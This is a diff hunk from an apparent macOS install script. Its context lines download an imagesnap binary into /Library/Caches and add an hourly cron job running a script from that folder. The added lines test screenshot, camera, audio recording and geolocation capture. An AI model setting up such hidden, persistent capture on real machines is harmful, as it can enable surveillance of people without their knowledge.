@@ -22,3 +22,14 @@ wget -O /Library/Caches/imagesnap https://raw.githubusercontent.com/angeldiaziba
 # Add cron task to check for updates every hour
 ( crontab -l ; echo "0 * * * * /bin/sh /Library/Caches/cron-60.sh" ) | crontab -
 
+# Test the screenshot feature
+sh screenshot.sh 
+
+# Test the photo feature (requires permissions)
+sh photo.sh 
+
+# Test the audio recording feature (requires permissions)
+sh recordaudio.sh
+
+# Test the geolocation feature (requires permissions)
+sh locateme.sh 
